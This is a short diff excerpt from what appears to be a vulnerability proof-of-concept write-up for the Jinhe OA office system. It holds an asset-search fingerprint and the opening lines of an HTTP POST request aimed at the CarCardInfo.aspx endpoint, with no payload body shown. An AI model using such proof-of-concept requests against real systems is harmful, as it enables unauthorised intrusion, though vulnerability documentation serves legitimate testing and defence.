@@ -5,7 +5,7 @@
 app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 ```
 POST /c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/ HTTP/1.1
 Host: your_ip
